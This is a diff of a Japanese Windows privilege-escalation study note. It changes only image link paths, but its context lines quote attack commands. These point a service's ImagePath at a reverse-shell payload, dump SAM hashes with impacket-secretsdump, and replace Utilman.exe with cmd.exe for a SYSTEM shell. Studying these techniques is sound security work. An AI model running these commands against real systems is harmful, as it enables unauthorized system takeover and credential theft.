@@ -115,7 +115,7 @@ sc.exe start "<service_name>"
 ```
 - →[Safe DLL Search Mode の探索順序](Windowsの基礎・前提知識/Windows%20Internal.md#Safe%20DLL%20Search%20Mode%20の探索順序)を念頭に当該レコードが先にロードされることを確かめる
 
-![](../../画像ファイル/Pasted%20image%2020250816122522.png)
+![](../../Images/Pasted%20image%2020250816122522.png)
 
 $$Result列がNot　Foundとなっている例$$
 
@@ -226,7 +226,7 @@ Write-ServiceBinary -Name '<service_name>' -Path '<writable_dir\payload>'
 .\accesschk.exe /accepteula -uwcqv %username% <service_name>
 ```
 - "SERVICE_CHANGE_CONFIG"または"SERVICE_ALL_ACCESS"を確認
-![ 400](../../画像ファイル/Pasted%20image%2020230503155428.png)
+![ 400](../../Images/Pasted%20image%2020230503155428.png)
 
 3. サービスの実行バイナリをリバースシェルペイロードに設定する
 ```cmd
@@ -263,7 +263,7 @@ net start <servic_namee>
 reg add HKLM\SYSTEM\CurrentControlSet\services\<service> /v ImagePath /t REG_EXPAND_SZ /d <path_to_payload> /f
 ```
 
-![](../../画像ファイル/Pasted%20image%2020230625110543.png)
+![](../../Images/Pasted%20image%2020230625110543.png)
 
 
 5. サービスを再起動する
@@ -402,7 +402,7 @@ copy "<path_to_payload>" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\S
 
 - 参考🔗：[Priv2Admin](https://github.com/gtworek/Priv2Admin)
 
-![](../../画像ファイル/Pasted%20image%2020250820172631.png)
+![](../../Images/Pasted%20image%2020250820172631.png)
 
 $$Priv2Adminの中身は権限ごとにPrivEsc技法概要がまとめられている$$
 
@@ -529,7 +529,7 @@ impacket-secretsdump -sam sam.hive -system system.hive LOCAL
 - このファイルは <u>SYSTEM 権限</u>で実行される
 	- → 所有権を取得して好きなペイロード（例：cmd.exe）に置き換えると、  SYSTEM 権限でコマンドを実行できる
 
-![](../../画像ファイル/Pasted%20image%2020250820173951.png)
+![](../../Images/Pasted%20image%2020250820173951.png)
 
 $$utilmanの場所を明示した画像$$
 
@@ -561,11 +561,11 @@ copy C:\Windows\System32\cmd.exe C:\Windows\System32\Utilman.exe
 
 4. 画面をロックし、Ease of Access ボタン（🕰️マーク）を押す
 
-![ 150](../../画像ファイル/Pasted%20image%2020230504114834.png)
+![ 150](../../Images/Pasted%20image%2020230504114834.png)
 
 	↓
 
-![ 300](../../画像ファイル/Pasted%20image%2020250820173951.png)
+![ 300](../../Images/Pasted%20image%2020250820173951.png)
 
 5. SYSTEM 権限でコマンドプロンプトが表示される
 
